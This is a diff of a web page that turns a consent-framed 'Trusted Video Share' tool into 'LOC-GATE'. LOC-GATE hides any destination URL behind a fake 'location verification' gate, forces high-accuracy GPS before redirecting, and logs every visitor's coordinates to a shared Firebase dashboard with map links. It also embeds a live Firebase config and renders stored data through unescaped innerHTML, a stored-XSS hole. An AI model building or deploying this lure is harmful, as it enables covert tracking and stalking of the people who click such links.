@@ -1,754 +1,440 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Trusted Video Share</title>
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LOC-GATE | Live Location-Gated Redirect</title>
   <style>
+    :root {
+      --bg-dark: #070b14;
+      --card-bg: rgba(17, 25, 40, 0.78);
+      --border-glow: rgba(16, 185, 129, 0.35);
+      --neon-green: #10b981;
+      --neon-hover: #059669;
+      --text-main: #f3f4f6;
+      --text-muted: #9ca3af;
+    }
+
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
     }
 
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f3f6fb;
-      color: #172033;
+      background: radial-gradient(circle at top right, #0f2922, var(--bg-dark) 60%);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
     }
 
-    .wrap {
-      width: min(92%, 560px);
-      margin: 30px auto;
+    .container {
+      width: 100%;
+      max-width: 460px;
+      background: var(--card-bg);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--border-glow);
+      border-radius: 20px;
+      padding: 28px 24px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 25px rgba(16, 185, 129, 0.12);
     }
 
-    .card {
-      background: #fff;
-      padding: 24px;
-      border-radius: 18px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, .1);
-      margin-bottom: 18px;
+    .brand {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
     }
 
-    h1,
-    h2 {
-      margin-top: 0;
+    .badge {
+      background: rgba(16, 185, 129, 0.15);
+      color: var(--neon-green);
+      border: 1px solid var(--border-glow);
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    p.subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      margin-bottom: 22px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
     }
 
     label {
       display: block;
-      font-weight: 600;
+      font-size: 13px;
+      color: var(--text-muted);
       margin-bottom: 6px;
     }
 
-    input {
+    input[type="url"],
+    input[type="text"] {
       width: 100%;
-      padding: 13px;
-      border: 1px solid #d5dbe5;
-      border-radius: 10px;
-      font-size: 16px;
-      margin-bottom: 12px;
-    }
-
-    button {
-      width: 100%;
-      padding: 13px;
-      border: 0;
-      border-radius: 10px;
-      background: #1769e0;
+      padding: 12px 14px;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      background: rgba(0, 0, 0, 0.35);
       color: #fff;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 7px;
-    }
-
-    button:disabled {
-      opacity: .55;
-      cursor: not-allowed;
-    }
-
-    .secondary {
-      background: #333;
-    }
-
-    .danger {
-      background: #a51d2d;
-    }
-
-    .small {
       font-size: 14px;
-      color: #5f6878;
-      line-height: 1.5;
+      outline: none;
+      transition: border 0.2s;
     }
 
-    .notice {
-      background: #eef6ff;
-      padding: 14px;
-      border-radius: 12px;
+    input:focus {
+      border-color: var(--neon-green);
     }
 
-    .result {
-      background: #edf9f0;
-      padding: 14px;
+    .btn {
+      width: 100%;
+      padding: 13px;
+      border: none;
       border-radius: 12px;
-      margin-top: 14px;
-      word-break: break-word;
+      background: var(--neon-green);
+      color: #031911;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 0 18px rgba(16, 185, 129, 0.35);
     }
 
-    .item {
-      background: #f7f8fa;
-      padding: 14px;
-      border-radius: 12px;
+    .btn:hover {
+      background: var(--neon-hover);
+      transform: translateY(-1px);
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--text-muted);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: none;
       margin-top: 10px;
     }
 
-    a {
-      color: #1769e0;
+    .btn-secondary:hover {
+      background: rgba(255, 255, 255, 0.05);
+      color: #fff;
+    }
+
+    .result-box {
+      display: none;
+      margin-top: 20px;
+      padding: 14px;
+      border-radius: 12px;
+      background: rgba(16, 185, 129, 0.08);
+      border: 1px dashed var(--border-glow);
+    }
+
+    .copy-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 8px;
+    }
+
+    .copy-btn {
+      padding: 0 14px;
+      border-radius: 10px;
+      border: 1px solid var(--neon-green);
+      background: rgba(16, 185, 129, 0.2);
+      color: var(--neon-green);
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .gate-icon {
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid var(--border-glow);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      font-size: 24px;
+    }
+
+    .center {
+      text-align: center;
+    }
+
+    .dest-preview {
+      background: rgba(0, 0, 0, 0.4);
+      padding: 10px 12px;
+      border-radius: 10px;
+      font-size: 13px;
+      color: var(--neon-green);
       word-break: break-all;
+      margin-bottom: 18px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .status-msg {
+      margin-top: 14px;
+      font-size: 13px;
+      text-align: center;
+      color: #fbbf24;
+      min-height: 20px;
+    }
+
+    .logs-section {
+      margin-top: 24px;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      padding-top: 16px;
+      max-height: 280px;
+      overflow-y: auto;
+    }
+
+    .log-item {
+      font-size: 12px;
+      background: rgba(0, 0, 0, 0.35);
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 8px;
+      border-left: 3px solid var(--neon-green);
+      line-height: 1.5;
     }
 
     .hidden {
       display: none;
     }
-
-    .status {
-      margin-top: 12px;
-      min-height: 20px;
-    }
-
-    .live {
-      background: #eefbf3;
-      border: 1px solid #b9e6c8;
-      padding: 14px;
-      border-radius: 12px;
-      margin-top: 14px;
-    }
-
-    .timer {
-      font-size: 24px;
-      font-weight: 700;
-      margin: 8px 0;
-    }
-
-    .pulse {
-      display: inline-block;
-      width: 9px;
-      height: 9px;
-      border-radius: 50%;
-      background: #18a957;
-      box-shadow: 0 0 0 5px rgba(24,169,87,.12);
-      margin-right: 8px;
-    }
   </style>
 </head>
-
 <body>
 
-  <div class="wrap">
+  <!-- VIEW 1: CREATOR DASHBOARD -->
+  <div id="creatorView" class="container">
+    <div class="brand">
+      <span class="badge">LOC-GATE LIVE</span>
+      <span id="dbStatus" style="font-size: 12px; color: #fbbf24;">● Connecting...</span>
+    </div>
+    <h1>Create Location-Gated Link</h1>
+    <p class="subtitle">
+      Paste any URL below. Visitors will see a clear location verification screen before opening the destination link.
+    </p>
 
-    <!-- CREATOR -->
-    <section id="creator" class="card">
+    <div class="input-group">
+      <label for="destInput">Destination URL (https://...)</label>
+      <input type="url" id="destInput" placeholder="https://www.youtube.com/watch?v=..." required />
+    </div>
 
-      <h1>🎬 Trusted Video Share</h1>
+    <button class="btn" onclick="generateLink()">Generate Gated Link</button>
 
-      <p class="small">
-        Create a consent-based location-sharing link for a trusted person.
-      </p>
-
-      <label for="videoUrl">
-        YouTube / Instagram video URL
-      </label>
-
-      <input
-        id="videoUrl"
-        type="url"
-        placeholder="https://www.youtube.com/watch?v=..."
-      >
-
-      <button id="generate">
-        Generate Share Link
-      </button>
-
-      <div id="creatorStatus" class="status small"></div>
-
-      <div id="generated" class="result hidden">
-
-        <strong>Share link</strong>
-
-        <p id="shareLink"></p>
-
-        <button id="copy" class="secondary">
-          Copy Link
-        </button>
-
+    <div id="resultBox" class="result-box">
+      <label>Shareable Gated Link:</label>
+      <div class="copy-row">
+        <input type="text" id="generatedUrl" readonly />
+        <button class="copy-btn" onclick="copyLink()">Copy</button>
       </div>
+    </div>
 
-      <h2 style="margin-top:28px">
-        📍 Received locations
-      </h2>
-
-      <div id="locations">
-        <p class="small">
-          No location received yet.
-        </p>
+    <div class="logs-section">
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <span style="font-size: 13px; font-weight: 600;">Live Verified Locations</span>
+        <button onclick="clearLogs()" style="background:none; border:none; color:#ef4444; font-size:12px; cursor:pointer;">Clear All</button>
       </div>
-
-    </section>
-
-
-    <!-- TRUSTED PERSON -->
-    <section id="trusted" class="card hidden">
-
-      <h1>Continue to Video</h1>
-
-      <div class="notice">
-        <strong>📍 Location Permission</strong>
-        <p class="small">
-          Tap the button below. Your browser will ask for location permission.
-          If you choose <b>Allow</b>, your location will be shared and the
-          video will open automatically.
-        </p>
+      <div id="logList">
+        <p style="font-size:12px; color:#6b7280; margin-top:8px;">Waiting for live data...</p>
       </div>
-
-      <button id="allow">
-        📍 Allow Location & Continue
-      </button>
-
-      <div id="trustedStatus" class="status small"></div>
-
-    </section>
-
+    </div>
   </div>
 
+  <!-- VIEW 2: VISITOR LOCATION GATE -->
+  <div id="gateView" class="container hidden">
+    <div class="gate-icon">📍</div>
+    <h1 class="center">Location Verification Required</h1>
+    <p class="subtitle center">
+      The link creator requires your GPS location verification before opening the destination URL below:
+    </p>
 
+    <div id="targetDisplay" class="dest-preview"></div>
+
+    <button class="btn" id="allowBtn" onclick="verifyAndRedirect()">ALLOW &amp; CONTINUE</button>
+    <button class="btn btn-secondary" onclick="goBack()">Decline &amp; Go Back</button>
+
+    <div id="statusMsg" class="status-msg"></div>
+  </div>
+
+  <!-- Firebase Modular SDK (v10) -->
   <script type="module">
-
-    /* =====================================================
-       FIREBASE
-    ===================================================== */
-
-    import { initializeApp }
-      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-
-    import {
-      getDatabase,
-      ref,
-      set,
-      push,
-      get,
-      onValue
-    }
-      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-
-    /* =====================================================
-       YOUR FIREBASE CONFIG
-    ===================================================== */
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, push, onValue, remove } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
     const firebaseConfig = {
-
-      apiKey:
-        "AIzaSyDDY5mO_arUXhhI-jHCxwOf5_KXrpp_DFY",
-
-      authDomain:
-        "first-vigil-476213-e0.firebaseapp.com",
-
-      databaseURL:
-        "https://first-vigil-476213-e0-default-rtdb.firebaseio.com",
-
-      projectId:
-        "first-vigil-476213-e0",
-
-      storageBucket:
-        "first-vigil-476213-e0.firebasestorage.app",
-
-      messagingSenderId:
-        "463765441887",
-
-      appId:
-        "1:463765441887:web:cf0d4c6ffca7036382baea",
-
-      measurementId:
-        "G-SKDWC7G75X"
+      apiKey: "AIzaSyDDY5mO_arUXhhI-jHCxwOf5_KXrpp_DFY",
+      authDomain: "first-vigil-476213-e0.firebaseapp.com",
+      databaseURL: "https://first-vigil-476213-e0-default-rtdb.firebaseio.com",
+      projectId: "first-vigil-476213-e0",
+      storageBucket: "first-vigil-476213-e0.firebasestorage.app",
+      messagingSenderId: "463765441887",
+      appId: "1:463765441887:web:cf0d4c6ffca7036382baea",
+      measurementId: "G-SKDWC7G75X"
     };
 
-
     const app = initializeApp(firebaseConfig);
-
     const db = getDatabase(app);
+    const logsRef = ref(db, 'locgate_verifications');
+    const connectedRef = ref(db, '.info/connected');
 
-
-    /* =====================================================
-       HELPERS
-    ===================================================== */
-
-    const $ = id =>
-      document.getElementById(id);
-
-
-    const params =
-      new URLSearchParams(location.search);
-
-    const shareId =
-      params.get("share");
-
-
-    const creator =
-      $("creator");
-
-    const trusted =
-      $("trusted");
-
-
-    function randomId() {
-
-      if (
-        window.crypto &&
-        crypto.getRandomValues
-      ) {
-
-        const bytes =
-          new Uint8Array(10);
-
-        crypto.getRandomValues(bytes);
-
-        return Array.from(
-          bytes,
-          b => b.toString(36).padStart(2, "0")
-        )
-          .join("")
-          .slice(0, 10);
+    const dbStatus = document.getElementById('dbStatus');
+    onValue(connectedRef, (snap) => {
+      if (snap.val() === true) {
+        dbStatus.textContent = '● Firebase Connected';
+        dbStatus.style.color = '#10b981';
+      } else {
+        dbStatus.textContent = '● Offline / Check Rules';
+        dbStatus.style.color = '#ef4444';
       }
+    });
 
-      return Date.now().toString(36) +
-        Math.random()
-          .toString(36)
-          .slice(2, 8);
-    }
+    const params = new URLSearchParams(window.location.search);
+    const encodedDest = params.get('dest');
 
+    const creatorView = document.getElementById('creatorView');
+    const gateView = document.getElementById('gateView');
+    let targetUrl = '';
 
-    function validVideoUrl(value) {
-
+    // Route between Gate View and Creator Dashboard
+    if (encodedDest) {
       try {
-
-        const u =
-          new URL(value);
-
-        return (
-          u.protocol === "https:" &&
-          (
-            /(^|\.)youtube\.com$/i.test(u.hostname) ||
-            /(^|\.)youtu\.be$/i.test(u.hostname) ||
-            /(^|\.)instagram\.com$/i.test(u.hostname)
-          )
-        );
-
-      } catch {
-
-        return false;
-
-      }
-    }
-
-
-    /* =====================================================
-       CREATOR MODE
-    ===================================================== */
-
-    if (!shareId) {
-
-      $("generate")
-        .addEventListener(
-          "click",
-          async () => {
-
-            const videoUrl =
-              $("videoUrl")
-                .value
-                .trim();
-
-
-            if (!validVideoUrl(videoUrl)) {
-
-              $("creatorStatus")
-                .textContent =
-                "Enter a valid HTTPS YouTube or Instagram URL.";
-
-              return;
-            }
-
-
-            $("generate")
-              .disabled = true;
-
-            $("generated")
-              .classList
-              .add("hidden");
-
-            $("creatorStatus")
-              .textContent =
-              "Creating share link...";
-
-
-            const id =
-              randomId();
-
-
-            const link =
-              location.origin +
-              location.pathname +
-              "?share=" +
-              encodeURIComponent(id);
-
-
-            const shareRef =
-              ref(
-                db,
-                "shares/" + id
-              );
-
-
-            try {
-
-              await set(
-                shareRef,
-                {
-                  videoUrl: videoUrl,
-                  createdAt: Date.now(),
-                  expiresAt: Date.now() + (30 * 60 * 1000),
-                  status: "waiting"
-                }
-              );
-
-
-              $("shareLink")
-                .textContent =
-                link;
-
-              $("generated")
-                .classList
-                .remove("hidden");
-
-              $("creatorStatus")
-                .textContent =
-                "Share link created successfully.";
-
-
-              watchLocations(id);
-
-
-            } catch (error) {
-
-              console.error(error);
-
-              $("creatorStatus")
-                .textContent =
-                "Could not create link. Check Firebase rules and configuration.";
-
-            } finally {
-
-              $("generate")
-                .disabled = false;
-            }
-
-          }
-        );
-
-
-      /* COPY */
-
-      $("copy")
-        .addEventListener(
-          "click",
-          async () => {
-
-            try {
-
-              await navigator.clipboard
-                .writeText(
-                  $("shareLink").textContent
-                );
-
-              $("copy")
-                .textContent =
-                "Copied ✓";
-
-
-              setTimeout(
-                () => {
-                  $("copy")
-                    .textContent =
-                    "Copy Link";
-                },
-                1500
-              );
-
-            } catch {
-
-              $("creatorStatus")
-                .textContent =
-                "Copy failed. Copy the link manually.";
-
-            }
-
-          }
-        );
-
-
-      /* WATCH LOCATIONS */
-
-      function watchLocations(id) {
-
-        onValue(
-          ref(
-            db,
-            "locations/" + id
-          ),
-
-          snapshot => {
-
-            const root =
-              $("locations");
-
-            root.innerHTML = "";
-
-
-            if (!snapshot.exists()) {
-
-              root.innerHTML =
-                '<p class="small">No location received yet.</p>';
-
-              return;
-            }
-
-
-            const entries =
-              Object.values(
-                snapshot.val()
-              ).reverse();
-
-
-            for (const loc of entries) {
-
-              const box =
-                document.createElement("div");
-
-              box.className =
-                "item";
-
-
-              const time =
-                new Date(
-                  loc.timestamp
-                ).toLocaleString();
-
-
-              const map =
-                "https://www.google.com/maps?q=" +
-                encodeURIComponent(
-                  `${loc.latitude},${loc.longitude}`
-                );
-
-
-              box.innerHTML = `
-
-                <strong>📍 Location received</strong>
-
-                <p class="small">
-
-                  Latitude:
-                  ${Number(loc.latitude).toFixed(6)}
-                  <br>
-
-                  Longitude:
-                  ${Number(loc.longitude).toFixed(6)}
-                  <br>
-
-                  Accuracy:
-                  approximately
-                  ${Math.round(Number(loc.accuracy))} m
-                  <br>
-
-                  Time:
-                  ${time}
-
-                </p>
-
-                <a
-                  href="${map}"
-                  target="_blank"
-                  rel="noopener"
-                >
-                  Open in Google Maps
-                </a>
-
-              `;
-
-
-              root.appendChild(box);
-
-            }
-
-          }
-        );
-
-      }
-
-    }
-
-
-    /* =====================================================
-       TRUSTED PERSON MODE
-       Click -> browser location popup -> Allow -> save location -> video
-    ===================================================== */
-
-    if (shareId) {
-
-      creator.classList.add("hidden");
-      trusted.classList.remove("hidden");
-
-      let shareData = null;
-      let finished = false;
-
-      async function loadShare() {
-        try {
-          const snapshot = await get(
-            ref(db, "shares/" + shareId)
-          );
-
-          if (!snapshot.exists()) {
-            $("trustedStatus").textContent =
-              "This share link is invalid or expired.";
-            $("allow").disabled = true;
-            return;
-          }
-
-          shareData = snapshot.val();
-
-          const expiresAt = Number(
-            shareData.expiresAt ||
-            (Number(shareData.createdAt || Date.now()) + 30 * 60 * 1000)
-          );
-
-          if (Date.now() >= expiresAt) {
-            $("trustedStatus").textContent =
-              "This share link has expired.";
-            $("allow").disabled = true;
-            return;
-          }
-
-          $("trustedStatus").textContent =
-            "Tap the button and choose Allow in the browser popup.";
-
-        } catch (error) {
-          console.error(error);
-          $("trustedStatus").textContent =
-            "Could not load this share link.";
-          $("allow").disabled = true;
+        targetUrl = decodeURIComponent(atob(encodedDest));
+        const parsed = new URL(targetUrl);
+        if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
+          creatorView.classList.add('hidden');
+          gateView.classList.remove('hidden');
+          document.getElementById('targetDisplay').textContent = targetUrl;
         }
+      } catch (e) {
+        console.error('Invalid destination URL');
       }
-
-      loadShare();
-
-      $("allow").addEventListener("click", () => {
-
-        if (!shareData || finished) return;
-
-        if (!navigator.geolocation) {
-          $("trustedStatus").textContent =
-            "This browser does not support location access.";
+    } else {
+      // Listen for real-time updates on Creator Dashboard
+      onValue(logsRef, (snapshot) => {
+        const logList = document.getElementById('logList');
+        const data = snapshot.val();
+        if (!data) {
+          logList.innerHTML = '<p style="font-size:12px; color:#6b7280; margin-top:8px;">No verifications logged yet.</p>';
           return;
         }
+        const entries = Object.values(data).reverse();
+        logList.innerHTML = entries.map(item => `
+          <div class="log-item">
+            <strong>Dest:</strong> ${item.dest}<br>
+            <strong>Coords:</strong> ${item.lat}, ${item.lng} (±${item.accuracy})<br>
+            <strong>Map:</strong> <a href="https://maps.google.com/?q=${item.lat},${item.lng}" target="_blank" style="color:#10b981;">Open in Google Maps</a><br>
+            <span style="color:#9ca3af;">${item.time}</span>
+          </div>
+        `).join('');
+      }, (error) => {
+        document.getElementById('logList').innerHTML = `<p style="font-size:12px; color:#ef4444; margin-top:8px;">Database Permission Error: ${error.message}</p>`;
+      });
+    }
 
-        $("allow").disabled = true;
-        $("trustedStatus").textContent =
-          "📍 Requesting location permission...";
+    window.generateLink = function () {
+      const input = document.getElementById('destInput').value.trim();
+      try {
+        const validUrl = new URL(input);
+        if (validUrl.protocol !== 'http:' && validUrl.protocol !== 'https:') {
+          alert('Please enter a valid http:// or https:// URL');
+          return;
+        }
+        const encoded = btoa(encodeURIComponent(validUrl.href));
+        const baseUrl = window.location.origin + window.location.pathname;
+        const finalLink = `${baseUrl}?dest=${encoded}`;
 
-        navigator.geolocation.getCurrentPosition(
+        document.getElementById('generatedUrl').value = finalLink;
+        document.getElementById('resultBox').style.display = 'block';
+      } catch (e) {
+        alert('Valid URL eta dia (jeman: https://www.youtube.com)');
+      }
+    };
 
-          async position => {
+    window.copyLink = function () {
+      const copyText = document.getElementById('generatedUrl');
+      copyText.select();
+      navigator.clipboard.writeText(copyText.value);
+      alert('Gated link copied!');
+    };
 
-            if (finished) return;
-            finished = true;
+    window.verifyAndRedirect = function () {
+      const statusMsg = document.getElementById('statusMsg');
+      const allowBtn = document.getElementById('allowBtn');
 
-            const loc = {
-              latitude: Number(position.coords.latitude),
-              longitude: Number(position.coords.longitude),
-              accuracy: Number(position.coords.accuracy),
-              timestamp: Date.now()
-            };
+      if (!navigator.geolocation) {
+        statusMsg.textContent = 'Browser does not support GPS.';
+        return;
+      }
 
-            $("trustedStatus").textContent =
-              "📍 Location received. Opening video...";
+      allowBtn.disabled = true;
+      allowBtn.textContent = 'Requesting GPS Permission...';
+      statusMsg.textContent = 'Please tap "Allow" on the browser location prompt.';
 
-            try {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude.toFixed(6);
+          const lng = position.coords.longitude.toFixed(6);
+          const accuracy = Math.round(position.coords.accuracy);
 
-              const locRef = push(
-                ref(db, "locations/" + shareId)
-              );
+          statusMsg.style.color = '#10b981';
+          statusMsg.textContent = 'Saving verification & redirecting...';
 
-              await set(locRef, loc);
-
-              await set(
-                ref(db, "shares/" + shareId + "/status"),
-                "location_received"
-              );
-
-              // Open the requested video automatically after the location
-              // has been successfully stored.
-              window.location.assign(shareData.videoUrl);
-
-            } catch (error) {
-
-              console.error(error);
-
-              $("trustedStatus").textContent =
-                "Location was received, but could not be saved. Video was not opened.";
-
-              $("allow").disabled = false;
-              finished = false;
-            }
-
-          },
-
-          error => {
-
-            console.warn("Geolocation error:", error);
-
-            $("allow").disabled = false;
-
-            if (error.code === 1) {
-              $("trustedStatus").textContent =
-                "❌ Location permission denied. Video was not opened.";
-            } else if (error.code === 2) {
-              $("trustedStatus").textContent =
-                "📍 Location unavailable. Turn on device Location and try again.";
-            } else if (error.code === 3) {
-              $("trustedStatus").textContent =
-                "⏳ Location request timed out. Please tap again.";
-            } else {
-              $("trustedStatus").textContent =
-                "Could not obtain your location. Please try again.";
-            }
-
-          },
-
-          {
-            // Faster mobile response.
-            enableHighAccuracy: false,
-            timeout: 5000,
-            maximumAge: 30000
+          try {
+            await push(logsRef, {
+              dest: targetUrl,
+              lat,
+              lng,
+              accuracy: `${accuracy}m`,
+              time: new Date().toLocaleString()
+            });
+          } catch (err) {
+            console.error('Firebase write error:', err);
           }
 
-        );
+          window.location.href = targetUrl;
+        },
+        (error) => {
+          allowBtn.disabled = false;
+          allowBtn.textContent = 'ALLOW & CONTINUE';
+          statusMsg.style.color = '#ef4444';
 
-      });
+          if (error.code === error.PERMISSION_DENIED) {
+            statusMsg.textContent = 'Permission denied. Destination link cannot open without location verification.';
+          } else {
+            statusMsg.textContent = 'Unable to fetch GPS. Enable device Location/GPS and try again.';
+          }
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    };
 
-    }    }
+    window.goBack = function () {
+      window.location.href = window.location.origin + window.location.pathname;
+    };
 
+    window.clearLogs = function () {
+      if (confirm('Clear all live verification logs?')) {
+        remove(logsRef);
+      }
+    };
   </script>
-
 </body>
-
 </html>
